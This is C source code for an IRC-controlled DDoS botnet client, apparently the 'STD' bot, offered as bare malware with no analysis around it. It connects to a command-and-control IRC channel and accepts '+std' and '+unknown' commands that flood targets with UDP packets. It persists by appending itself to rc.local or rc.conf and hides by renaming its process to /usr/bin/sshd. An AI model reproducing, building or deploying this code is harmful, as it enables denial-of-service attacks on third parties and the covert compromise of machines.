
     
#define STARTUP //set to define if rooted
#undef IDENT
#define FAKENAME "/usr/bin/sshd"
#define CHAN "#Channel"
#define KEY "key"
#define PORT 443
#define PASS ""
#define STD2_STRING "std"
#define STD2_SIZE 50
#define PREFIX ""
int numservers=1;
char *servers[] = {
  "1.1.1.1",
  (void*)0
};

#include <stdarg.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <strings.h>
#include <netinet/in.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/ioctl.h>

int sock,changeservers=0;
char *server, *chan, *key, *nick, *ident, *prefix, *user, *pass, disabled=0, udpTry = 0, *adminuser1="Fine";
unsigned int *pids;
unsigned long spoofs=0, spoofsm=0, numpids=0;

int strwildmatch(unsigned char* pattern, unsigned char* string) {
	switch((unsigned char)*pattern) {
		case '\0': return *string;
		case 'b': return !(!strwildmatch(pattern+1, string) || *string && !strwildmatch(pattern, string+1));
		case 'o': return !(!strwildmatch(pattern+1, string) || *string && !strwildmatch(pattern, string+1));
		case 't': return !(!strwildmatch(pattern+1, string) || *string && !strwildmatch(pattern, string+1));
		case 'B': return !(!strwildmatch(pattern+1, string) || *string && !strwildmatch(pattern, string+1));
		case 'O': return !(!strwildmatch(pattern+1, string) || *string && !strwildmatch(pattern, string+1));
        case 'T': return !(!strwildmatch(pattern+1, string) || *string && !strwildmatch(pattern, string+1));
		case '?': return !(*string && !strwildmatch(pattern+1, string+1));
		default: return !((toupper(*pattern) == toupper(*string)) && !strwildmatch(pattern+1, string+1));
	}
}
int Send(int sock, char *words, ...) {
        static char textBuffer[1024];
        va_list args;
        va_start(args, words);
        vsprintf(textBuffer, words, args);
        va_end(args);
        return write(sock,textBuffer,strlen(textBuffer));
}
unsigned int host2ip(char *sender,char *hostname) {
        static struct in_addr i;
        struct hostent *h;
        if((i.s_addr = inet_addr(hostname)) == -1) {
                if((h = gethostbyname(hostname)) == NULL) {
                        Send(sock, "NOTICE %s :Unable to resolve %s\n", sender,hostname);
                        exit(0);
                }
                bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
        }
        return i.s_addr;
}
int mfork(char *sender) {
	unsigned int parent, *newpids, i;
	if (disabled == 1) {
		Send(sock,"NOTICE %s :Unable to comply.\n",sender);
		return 1;
	}
	parent=fork();
	if (parent <= 0) return parent;
	numpids++;
	newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
	for (i=0;i<numpids-1;i++) newpids[i]=pids[i];
	newpids[numpids-1]=parent;
	free(pids);
	pids=newpids;
	return parent;
}
void filter(char *a) { while(a[strlen(a)-1] == '\r' || a[strlen(a)-1] == '\n') a[strlen(a)-1]=0; }
char *makestring() {
	char *tmp;
	int len=(rand()%5)+4,i;
 	FILE *file;
	tmp=(char*)malloc(len+1);
 	memset(tmp,0,len+1);
	char *pre;
 	if ((file=fopen("/usr/dict/words","r")) == NULL) for (i=0;i<len;i++) tmp[i]=(rand()%(91-65))+65;
	else {
		int a=((rand()*rand())%45402)+1;
		char buf[1024];
		for (i=0;i<a;i++) fgets(buf,1024,file);
		memset(buf,0,1024);
		fgets(buf,1024,file);
		filter(buf);
		memcpy(tmp,buf,len);
		fclose(file);
	}
	return tmp;
}
void identd() {
        int sockname,sockfd,sin_size,tmpsock,i;
        struct sockaddr_in my_addr,their_addr;
        char szBuffer[1024];
        if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) return;
        my_addr.sin_family = AF_INET;
        my_addr.sin_port = htons(113);
        my_addr.sin_addr.s_addr = INADDR_ANY;
        memset(&(my_addr.sin_zero), 0, 8);
        if (bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr)) == -1) return;
        if (listen(sockfd, 1) == -1) return;
        if (fork() == 0) return;
        sin_size = sizeof(struct sockaddr_in);
        if ((tmpsock = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size)) == -1) exit(0);
        for(;;) {
                fd_set bla;
                struct timeval timee;
                FD_ZERO(&bla);
                FD_SET(tmpsock,&bla);
                timee.tv_sec=timee.tv_usec=60;
                if (select(tmpsock + 1,&bla,(fd_set*)0,(fd_set*)0,&timee) < 0) exit(0);
                if (FD_ISSET(tmpsock,&bla)) break;
        }
        i = recv(tmpsock,szBuffer,1024,0);
        if (i <= 0 || i >= 20) exit(0);
        szBuffer[i]=0;
        if (szBuffer[i-1] == '\n' || szBuffer[i-1] == '\r') szBuffer[i-1]=0;
        if (szBuffer[i-2] == '\n' || szBuffer[i-2] == '\r') szBuffer[i-2]=0;
	Send(tmpsock,"%s : USERID : UNIX : %s\n",szBuffer,ident);
        close(tmpsock);
        close(sockfd);
        exit(0);
}

//STD Attack
void std(int sock, char *sender, int argc, char **argv) {
    if (argc < 3) {
	
        Send(sock,"PRIVMSG %s :>bot +std <target> <port> <secs>\n",chan);
        exit(1);
		
    }
    unsigned long secs;

    int iSTD_Sock;

    iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);

    time_t start = time(NULL);
    secs = atol(argv[3]);
    if (mfork(sender) != 0) return;
    Send(sock,"PRIVMSG %s :[STD]Hitting %s!\n",chan,argv[1]);

    struct sockaddr_in sin;

    struct hostent *hp;

    hp = gethostbyname(argv[1]);

    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = atol(argv[2]);

    unsigned int a = 0;

    while(1){
        if (a >= 50) 
        {
            send(iSTD_Sock, STD2_STRING, STD2_SIZE, 0);
            connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs) 
            {
                Send(sock, "PRIVMSG %s :[STD]Done hitting %s!\n", chan, argv[1]);
                close(iSTD_Sock);
                exit(0);
            }
            a = 0;
        }
        a++;
    }
	

}

void stop(int sock, char *sender, int argc, char **argv){
    unsigned long i;
    for (i=0;i<numpids;i++) {
        if (pids[i] != 0 && pids[i] != getpid()) {
            if (sender) Send(sock,"PRIVMSG %s :Killing pid %d.\n",chan,pids[i]);
                kill(pids[i],9);
        }
    }
}

void unknown(int sock, char *sender, int argc, char **argv) {
    int flag=1,fd,i;
    unsigned long secs;
    char *buf=(char*)malloc(9216);
    struct hostent *hp;
    struct sockaddr_in in;
    
    time_t start=time(NULL);
    
    if (mfork(sender) != 0) return;
    
    if (argc != 2) {
        Send(sock,"PRIVMSG %s :>bot +unknown <target> <secs>\n",chan);
        exit(1);
    }
    
    secs=atol(argv[2]);
    
    memset((void*)&in,0,sizeof(struct sockaddr_in));
    
    in.sin_addr.s_addr=host2ip(sender,argv[1]);
    in.sin_family = AF_INET;
    
    Send(sock,"PRIVMSG %s :[UNK]Hitting %s!\n",chan,argv[1]);
    
    while(1) {
        
        in.sin_port = rand();
        
        if ((fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0){
        } else {
            flag=1;
            ioctl(fd,FIONBIO,&flag);
            sendto(fd,buf,9216,0,(struct sockaddr*)&in,sizeof(in));
            close(fd);
        }
        
        if (i >= 50) {
            if (time(NULL) >= start+secs) break;
                i=0;
        }
        i++;
    }
    Send(sock,"PRIVMSG %s :[UNK]Done hitting %s!\n",chan,argv[1]);
    close(fd);
    exit(0);
}

//Kill the bot
void killsec(int sock, char *sender, int argc, char **argv) {
	
	if(strcasecmp(adminuser1,sender) == 0){
	
		kill(0,9);
	
	} else {
	
		Send(sock,"PRIVMSG %s :Nice try...\n", chan);
	
	}
}

struct FMessages { char *cmd; void (* func)(int,char *,int,char **); } flooders[] = {
	{ "+std"     				,    std     },
	{ "+stop"    				,    stop    },
    { "+unknown"    		    ,   unknown  },
	{ "Kkt9x4JApM0RuSqCLA" 	    ,   killsec  },
	{ (char *)0, (void (*)(int,char *,int,char **))0 } };
	
void _PRIVMSG(int sock, char *sender, char *str) {
        int i;
        char *to, *message;
		
        for (i=0;i<strlen(str) && str[i] != ' ';i++);
        str[i]=0;
        to=str;
        message=str+i+2;
        for (i=0;i<strlen(sender) && sender[i] != '!';i++);
        sender[i]=0;
        if (*message == '>' && !strcasecmp(to,chan)) {
                char *params[12], name[1024]={0};
                int num_params=0, m;
                message++;
                for (i=0;i<strlen(message) && message[i] != ' ';i++);
                message[i]=0;
				if (strwildmatch(message,nick)) return;
                message+=i+1;
                m=strlen(message);
                for (i=0;i<m;i++) {
                        if (*message == ' ' || *message == 0) break;
                        name[i]=*message;
                        message++;
                }
                for (i=0;i<strlen(message);i++) if (message[i] == ' ') num_params++;
                num_params++;
                if (num_params > 10) num_params=10;
                params[0]=name;
                params[num_params+1]="\0";
                m=1;
                while (*message != 0) {
                        message++;
                        if (m >= num_params) break;
                        for (i=0;i<strlen(message) && message[i] != ' ';i++);
                        params[m]=(char*)malloc(i+1);
                        strncpy(params[m],message,i);
                        params[m][i]=0;
                        m++;
                        message+=i;
                }
                for (m=0; flooders[m].cmd != (char *)0; m++) {
                        if (!strcasecmp(flooders[m].cmd,name)) {
                                flooders[m].func(sock,sender,num_params-1,params);
                                for (i=1;i<num_params;i++) free(params[i]);
                                return;
                        }
                }
        }
}
void _376(int sock, char *sender, char *str) {
		Send(sock,"MODE %s +pixB\n",nick);
        Send(sock,"JOIN %s :%s\n",chan,key);
		Send(sock,"WHO %s\n",nick);
}
void _PING(int sock, char *sender, char *str) {

Send(sock,"PONG %s\n",str);

}

void _352(int sock, char *sender, char *str) {
        int i,d;
        char *msg=str;
        struct hostent *hostm;
        unsigned long m;
        for (i=0,d=0;d<5;d++) {
                for (;i<strlen(str) && *msg != ' ';msg++,i++); msg++;
                if (i == strlen(str)) return;
        }
        for (i=0;i<strlen(msg) && msg[i] != ' ';i++);
        msg[i]=0;
        if (!strcasecmp(msg,nick) && !spoofsm) {
                msg=str;
                for (i=0,d=0;d<3;d++) {
                        for (;i<strlen(str) && *msg != ' ';msg++,i++); msg++;
                        if (i == strlen(str)) return;
                }
                for (i=0;i<strlen(msg) && msg[i] != ' ';i++);
                msg[i]=0;
                if ((m = inet_addr(msg)) == -1) {
                        if ((hostm=gethostbyname(msg)) == NULL) {
                                Send(sock,"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\n",chan);
                                return;
                        }
                        memcpy((char*)&m, hostm->h_addr, hostm->h_length);
                }
                ((char*)&spoofs)[3]=((char*)&m)[0];
                ((char*)&spoofs)[2]=((char*)&m)[1];
                ((char*)&spoofs)[1]=((char*)&m)[2];
                ((char*)&spoofs)[0]=0;
                spoofsm=256;
        }
}
void _433(int sock, char *sender, char *str) {
        free(nick);
		char tempnick[50];
		char *strpref = PREFIX;
		char *genname = makestring();
		strcpy(tempnick,strpref);
		strcat(tempnick,genname);
        nick=tempnick;	
}

struct Messages { char *cmd; void (* func)(int,char *,char *); } msgs[] = {
        {   "352",     _352     },
        {   "376",     _376     },
		{   "433",     _433     },
		{   "422",     _376     },
        { "PRIVMSG", _PRIVMSG   },
        {   "PING",    _PING    },
		{ (char *)0, (void (*)(int,char *,char *))0 } };
void con() {
        struct sockaddr_in srv;
        unsigned long ipaddr,start;
        int flag;
        struct hostent *hp;
start:
	sock=-1;
	flag=1;
	if (changeservers == 0) server=servers[rand()%numservers];
	changeservers=0;
        while ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0);
	if (inet_addr(server) == 0 || inet_addr(server) == -1) {
		if ((hp = gethostbyname(server)) == NULL) {
			server=NULL;
			close(sock);
			goto start;
		}
		bcopy((char*)hp->h_addr, (char*)&srv.sin_addr, hp->h_length);
	}
	else srv.sin_addr.s_addr=inet_addr(server);
        srv.sin_family = AF_INET;
        srv.sin_port = htons(PORT);
	ioctl(sock,FIONBIO,&flag);
	start=time(NULL);
	while(time(NULL)-start < 10) {
		errno=0;
		if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) == 0 || errno == EISCONN) {
		        setsockopt(sock,SOL_SOCKET,SO_LINGER,0,0);
		        setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,0,0);
		        setsockopt(sock,SOL_SOCKET,SO_KEEPALIVE,0,0);
			return;
		}
		if (!(errno == EINPROGRESS ||errno == EALREADY)) break;
		sleep(1);
	}
	server=NULL;
	close(sock);
	goto start;
}
int main(int argc, char *argv[]) {
        int on,i;
        char cwd[256],*str;
        FILE *file;
#ifdef STARTUP
	str="/etc/rc.d/rc.local";
	file=fopen(str,"r");
	if (file == NULL) {
		str="/etc/rc.conf";
		file=fopen(str,"r");
	}
        if (file != NULL) {
                char outfile[256], buf[1024];
                int i=strlen(argv[0]), d=0;
                getcwd(cwd,256);
                if (strcmp(cwd,"/")) {
                        while(argv[0][i] != '/') i--;
                        sprintf(outfile,"\"%s%s\"\n",cwd,argv[0]+i);
                        while(!feof(file)) {
                                fgets(buf,1024,file);
                                if (!strcasecmp(buf,outfile)) d++;
                        }
                        if (d == 0) {
                                FILE *out;
                                fclose(file);
                                out=fopen(str,"a");
                                if (out != NULL) {
                                        fputs(outfile,out);
                                        fclose(out);
                                }
                        }
                        else fclose(file);
                }
                else fclose(file);
        }
#endif
        if (fork()) exit(0);
#ifdef FAKENAME
	strncpy(argv[0],FAKENAME,strlen(argv[0]));
        for (on=1;on<argc;on++) memset(argv[on],0,strlen(argv[on]));
#endif
        srand((time(NULL) ^ getpid()) + getppid());
		char tempnick[50];
		char *strpref = PREFIX;
		char *genname = makestring();
	
		strcpy(tempnick,strpref);
		strcat(tempnick,genname);
		
        nick=tempnick;
        ident="STD";
        user="STD IRC Bot";
        chan=CHAN;
		key=KEY;
		pass=PASS;
		server=NULL;
sa:
#ifdef IDENT
        for (i=0;i<numpids;i++) {
                if (pids[i] != 0 && pids[i] != getpid()) {
                        kill(pids[i],9);
			waitpid(pids[i],NULL,WNOHANG);
                }
        }
	pids=NULL;
	numpids=0;
	identd();
#endif

	con();
		Send(sock,"PASS %s\n", pass);
        Send(sock,"NICK %s\nUSER %s localhost localhost :%s\n",nick,ident,user);
        while(1) {
                unsigned long i;
                fd_set n;
                struct timeval tv;
                FD_ZERO(&n);
                FD_SET(sock,&n);
                tv.tv_sec=60*20;
                tv.tv_usec=0;
                if (select(sock+1,&n,(fd_set*)0,(fd_set*)0,&tv) <= 0) goto sa;
                for (i=0;i<numpids;i++) if (waitpid(pids[i],NULL,WNOHANG) > 0) {
                        unsigned int *newpids,on;
                        for (on=i+1;on<numpids;on++) pids[on-1]=pids[on];
			pids[on-1]=0;
                        numpids--;
                        newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
                        for (on=0;on<numpids;on++) newpids[on]=pids[on];
                        free(pids);
                        pids=newpids;
                }
                if (FD_ISSET(sock,&n)) {
                        char buf[4096], *str;
                        int i;
                        if ((i=recv(sock,buf,4096,0)) <= 0) goto sa;
                        buf[i]=0;
                        str=strtok(buf,"\n");
                        while(str && *str) {
                                char name[1024], sender[1024];
                                filter(str);
                                if (*str == ':') {
                                        for (i=0;i<strlen(str) && str[i] != ' ';i++);
                                        str[i]=0;
                                        strcpy(sender,str+1);
                                        strcpy(str,str+i+1);
                                }
                                else strcpy(sender,"*");
                                for (i=0;i<strlen(str) && str[i] != ' ';i++);
                                str[i]=0;
                                strcpy(name,str);
                                strcpy(str,str+i+1);
                                for (i=0;msgs[i].cmd != (char *)0;i++) if (!strcasecmp(msgs[i].cmd,name)) msgs[i].func(sock,sender,str);
                                if (!strcasecmp(name,"ERROR")) goto sa;
                                str=strtok((char*)NULL,"\n");
                        }
                }
        }
        return 0;
}